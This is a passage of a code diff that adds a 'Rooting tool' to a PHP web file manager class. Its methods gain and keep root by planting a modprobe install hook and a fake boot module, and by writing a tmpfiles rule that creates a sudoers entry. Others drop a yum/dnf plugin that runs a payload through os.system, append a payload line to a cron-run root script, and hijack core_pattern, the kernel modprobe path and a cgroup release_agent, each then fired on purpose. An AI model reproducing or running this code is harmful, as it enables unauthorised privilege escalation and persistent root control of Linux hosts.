+        $fake = 'mfm-absent-' . $nonce;
+        $conf = rtrim($dir, '/') . '/mfm-' . $nonce . '.conf';
+        $body = "# mfm " . $nonce . " - planted by the Rooting tool\ninstall " . $fake . " /bin/sh '" . $this->rootPlantPayloadPath($id) . "'\n";
+        if(@file_put_contents($conf, $body) === false)return['ok' => false, 'note' => 'the hook could not be written to ' . $conf];
+        @chmod($conf, 0644);
+        $rec['files'][] = $conf;
+        /* the module has to be asked for, so a name nobody owns is put in the
+           list of modules loaded at boot - no real module is touched */
+        foreach(['/etc/modules-load.d', '/etc/modules'] as $ld){
+            if($ld === '/etc/modules'){
+                if(!@is_file($ld) || !@is_writable($ld))continue;
+                $was = (string)@file_get_contents($ld);
+                if(@file_put_contents($ld, rtrim($was, "\n") . "\n" . $fake . "\n") !== false){
+                    $rec['restore'][] = ['file' => $ld, 'was' => $was];
+                }
+                continue;
+            }
+            if(!@is_dir($ld) || !@is_writable($ld))continue;
+            $mp = rtrim($ld, '/') . '/mfm-' . $nonce . '.conf';
+            if(@file_put_contents($mp, "# mfm " . $nonce . "\n" . $fake . "\n") !== false){
+                @chmod($mp, 0644);
+                $rec['files'][] = $mp;
+            }
+        }
+        return['ok' => true, 'note' => 'a hook for a module named ' . $fake . ' was planted at ' . $conf . ', and that name was added to what the boot loads', 'rec' => $rec];
+    }
+    private function rootPlantTmpfiles($id, $s, $dir, &$rec){
+        $nonce = $this->rootPlantNonce($id);
+        $rule = $this->rootPlantRulePath($id);
+        if(@file_put_contents($rule, $this->rootHelperContent()) === false)
+            return['ok' => false, 'note' => 'the rule could not be written to ' . $rule];
+        @chmod($rule, 0644);
+        $rec['files'][] = $rule;
+        $conf = rtrim($dir, '/') . '/mfm-' . $nonce . '.conf';
+        /* C = create, copying the rule in as root, with the mode and the owner
+           sudo insists on - so the machine writes its own sudoers file */
+        $body = "# mfm " . $nonce . " - planted by the Rooting tool\nC /etc/sudoers.d/90-marshal-fm 0440 root root - " . $rule . "\n";
+        if(@file_put_contents($conf, $body) === false)return['ok' => false, 'note' => 'the tmpfiles rule could not be written to ' . $conf];
+        @chmod($conf, 0644);
+        $rec['files'][] = $conf;
+        return['ok' => true, 'note' => 'a tmpfiles rule was planted at ' . $conf . ', so the machine copies the sudo rule in as root on the way up', 'rec' => $rec];
+    }
+    private function rootPlantYum($id, $s, $dir, &$rec){
+        $nonce = $this->rootPlantNonce($id);
+        $stamp = 'mfm-' . $nonce;
+        $conf = rtrim($dir, '/') . '/' . $stamp . '.conf';
+        if(@file_put_contents($conf, "[main]\nenabled=1\nplugins=1\n") === false)
+            return['ok' => false, 'note' => 'the plugin configuration could not be written to ' . $conf];
+        @chmod($conf, 0644);
+        $rec['files'][] = $conf;
+        /* the module itself lives beside the configuration, in the directory
+           yum keeps for plugins of this shape */
+        $mods = ['/usr/lib/yum-plugins', '/usr/lib/python2.7/site-packages/yum-plugins', '/usr/lib/python3/dist-packages/yum-plugins'];
+        $py = "from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nimport os\n\nrequires_api_version = '2.6'\nplugin_type = (TYPE_CORE, TYPE_INTERACTIVE)\n\n\ndef init_hook(conduit):\n    os.system(\"/bin/sh '" . $this->rootPlantPayloadPath($id) . "'\")\n";
+        $wrote = false;
+        foreach($mods as $md){
+            if(!@is_dir($md) || !@is_writable($md))continue;
+            $mp = rtrim($md, '/') . '/' . $stamp . '.py';
+            if(@file_put_contents($mp, $py) !== false){ @chmod($mp, 0644); $rec['files'][] = $mp; $wrote = true; break; }
+        }
+        if(!$wrote)return['ok' => false, 'note' => 'the plugin configuration was written, but no plugin directory would take the module'];
+        return['ok' => true, 'note' => 'a plugin for yum and dnf was planted - configuration at ' . $conf . ', module beside it', 'rec' => $rec];
+    }
+    private function rootPlantHijackWrite($id, $s, &$rec){
+        $h = $this->rootPlantHijack($id);
+        if(empty($h['ok']))return['ok' => false, 'note' => (string)($h['note'] ?? 'no scheduled program is writable')];
+        $file = (string)$h['file'];
+        $was = (string)@file_get_contents($file);
+        $add = "\n# mfm " . $this->rootPlantNonce($id) . " - planted by the Rooting tool\n"
+             . "if [ \"$(id -u 2>/dev/null)\" = \"0\" ]; then ( /bin/sh '" . $this->rootPlantPayloadPath($id) . "' >/dev/null 2>&1 & ) ; fi\n";
+        if(@file_put_contents($file, $was . $add) === false)
+            return['ok' => false, 'note' => 'the job at ' . $file . ' could not be written'];
+        $rec['target'] = $file;
+        $rec['restore'][] = ['file' => $file, 'was' => $was];
+        return['ok' => true, 'note' => 'a line was added to ' . $file . ', which the machine already runs as root on a schedule', 'rec' => $rec];
+    }
+    private function rootPlantKernel($id, $s, &$rec){
+        if($id === 'corepattern'){
+            $f = '/proc/sys/kernel/core_pattern';
+            $was = (string)@file_get_contents($f);
+            if(@file_put_contents($f, '|' . $this->rootPlantPayloadPath($id)) === false)
+                return['ok' => false, 'note' => 'core_pattern would not take the new value'];
+            $rec['restore'][] = ['file' => $f, 'was' => $was];
+            $rec['trigger'] = 'corepattern';
+            return['ok' => true, 'note' => 'core_pattern now names this manager, and the old value (' . trim($was) . ') was kept', 'rec' => $rec];
+        }
+        if($id === 'kernelmodprobe'){
+            $f = '/proc/sys/kernel/modprobe';
+            $was = (string)@file_get_contents($f);
+            if(@file_put_contents($f, $this->rootPlantPayloadPath($id)) === false)
+                return['ok' => false, 'note' => 'modprobe would not take the new value'];
+            $rec['restore'][] = ['file' => $f, 'was' => $was];
+            $rec['trigger'] = 'kernelmodprobe';
+            return['ok' => true, 'note' => 'the module loader now names this manager, and the old value (' . trim($was) . ') was kept', 'rec' => $rec];
+        }
+        $cg = $this->rootPlantCgroupV1();
+        if(!$cg)return['ok' => false, 'note' => 'no cgroup of the first kind would take a release agent'];
+        $grp = rtrim($cg['base'], '/') . '/mfm-' . $this->rootPlantNonce($id);
+        if(!@is_dir($grp) && !@mkdir($grp, 0755))return['ok' => false, 'note' => 'a cgroup of its own could not be made'];
+        $wasAgent = (string)@file_get_contents($cg['agent']);
+        $wasNotify = (string)@file_get_contents($cg['base'] . '/notify_on_release');
+        if(@file_put_contents($cg['agent'], $this->rootPlantPayloadPath($id)) === false)
+            return['ok' => false, 'note' => 'the release agent would not take the new value'];
+        @file_put_contents($cg['base'] . '/notify_on_release', '1');
+        $rec['restore'][] = ['file' => $cg['agent'], 'was' => $wasAgent];
+        $rec['restore'][] = ['file' => $cg['base'] . '/notify_on_release', 'was' => $wasNotify];
+        $rec['trigger'] = 'cgroupagent';
+        $rec['cgroup'] = $grp;
+        $rec['files'][] = $grp;
+        return['ok' => true, 'note' => 'the release agent of ' . $cg['base'] . ' now names this manager, in a group of its own', 'rec' => $rec];
+    }
+    /* asking a planted method to fire while we are still here: the kernel
+       routes are triggered on purpose, everything else is simply run through
+       whatever root happens to be reachable - which may well be none at all,
+       and that is exactly the case the plant exists for */
+    private function rootPlantFireNow($id, $s, $password = ''){
+        $rec = null;
+        $st = $this->rootState();
+        if(is_array($st['plants'] ?? null))$rec = $st['plants'][$id] ?? null;
+        $trig = is_array($rec) ? (string)($rec['trigger'] ?? '') : '';
+        if($trig === 'corepattern'){
+            /* a core dump is asked for the ordinary way: a process is killed
+               with the signal that produces one */
+            $this->rootExec(['sh', '-c', 'ulimit -c unlimited 2>/dev/null; kill -SEGV $$'], '', 10);
+        }elseif($trig === 'kernelmodprobe'){
+            /* the kernel asks its loader for a module when it meets a file in a
+               format no handler claims, so one is made and run */
+            $tmp = @tempnam($this->rootPlantDir(), 'mfm-bin');
+            if($tmp !== false){
+                @file_put_contents($tmp, "\x7fMFM\x00\x00\x00");
+                @chmod($tmp, 0755);
+                $this->rootExec([$tmp], '', 10);
+                @unlink($tmp);
+            }
+        }elseif($trig === 'cgroupagent'){
+            $grp = is_array($rec) ? (string)($rec['cgroup'] ?? '') : '';
+            $procs = $grp !== '' ? $grp . '/cgroup.procs' : '';
+            if($procs !== '' && @is_writable($procs)){
+                $me = (string)@getmypid();
+                @file_put_contents($procs, $me);
+                /* the agent runs when the last process leaves, so a short-lived
+                   child is put in the group and allowed to end */
+                $this->rootExec(['sh', '-c', 'echo $$ > ' . $procs . ' 2>/dev/null; true'], '', 10);
+            }
+        }
+        $wait = max(0, (int)($s['wait'] ?? 0));
+        $deadline = time() + ($trig !== '' ? min(20, $wait) : 0);
+        do{
+            if($this->rootPlantProofOk($id))return['ok' => true];
+            if($trig !== '' && time() < $deadline)sleep(1);
+        }while($trig !== '' && time() < $deadline);
+        /* nothing fired on its own, so the payload is run through whatever root
+           is reachable right now - a plant is not a failure when nothing is */
+        $pl = $this->rootPlantPayloadPath($id);
+        if($pl === '')return['ok' => false];
+        $r = $this->rootAs(['sh', $pl], $password);
+        if(!empty($r['ok']) && $this->rootPlantProofOk($id))return['ok' => true];
+        return['ok' => false];
+    }
+    /* taking a plant back out, and putting back whatever it touched */
+    private function rootPlantUndo($id){
+        $st = $this->rootState();
+        $rec = is_array($st['plants'] ?? null) ? ($st['plants'][$id] ?? null) : null;
+        $paths = [$this->rootPlantPayloadPath($id), $this->rootPlantProofPath($id),
+                  $this->rootPlantRulePath($id), $this->rootPlantLogPath($id)];
+        if(!is_array($rec)){
+            foreach($paths as $f)if((string)$f !== '')@unlink((string)$f);
+            return['ok' => true, 'note' => 'nothing was on record for this method, so its files were cleaned up'];
+        }
+        foreach((array)($rec['restore'] ?? []) as $r){
+            if(!empty($r['file']) && isset($r['was']))@file_put_contents((string)$r['file'], (string)$r['was']);
+        }
+        $nonce = (string)($rec['nonce'] ?? '');
+        foreach((array)($rec['strip'] ?? []) as $f){
+            if(!@is_file($f) || !@is_writable($f))continue;
+            $keep = [];
+            foreach(preg_split('/\R/', (string)@file_get_contents($f)) ?: [] as $ln)
+                if($nonce === '' || strpos($ln, $nonce) === false)$keep[] = $ln;
+            @file_put_contents($f, implode("\n", $keep) . "\n");
+        }
+        foreach((array)($rec['files'] ?? []) as $f)if((string)$f !== '')@unlink((string)$f);
+        foreach($paths as $f)if((string)$f !== '')@unlink((string)$f);
+        unset($st['plants'][$id]);
+        $this->rootStateSave($st);
+        return['ok' => true, 'note' => 'the plant was taken out, and everything it had written was put back'];
+    }
+
+    /* ── the automatic installer: try every method, stop at the first proof ─ */
+    public function rootingInstallRoot($password = ''){
         /* the same chain, walked one method at a time through the same code the
            panel walks it: one answer per method, and it stops at the first
            method whose proof command really comes back as uid 0 */
@@ -11740,6 +12799,15 @@ class FileManager {
         if($act === 'rooted')return['ok' => true, 'rooted' => $this->rootingRooted()];
         if($act === 'rootctl')return$this->rootingControl((string)($post['ctl'] ?? ''), (string)($post['line'] ?? ''));
         if($act === 'rootmethod')return$this->rootingMethod((string)($post['id'] ?? ''), $password);
+        /* taking a planted method back out: it is a thing that was put somewhere,
+           so it can be taken away again, and whatever it touched is put back */
+        if($act === 'rootplantremove'){
+            $rid = (string)($post['id'] ?? '');
+            if($this->rootPlantSpec($rid) === null)return['ok' => false, 'error' => 'That method is not one of the planted ones.'];
+            $rr = $this->rootChannelRemove($rid, $password);
+            return['ok' => !empty($rr['ok']), 'id' => $rid, 'note' => (string)($rr['note'] ?? ''),
+                   'state' => $this->rootingRooted()];
+        }
         if($act === 'rootuninstall')return$this->rootingUninstall($password);
         if($act === 'keep')return$this->rootInstallHelper($password);
         if($act === 'revoke')return$this->rootRemoveHelper($password);
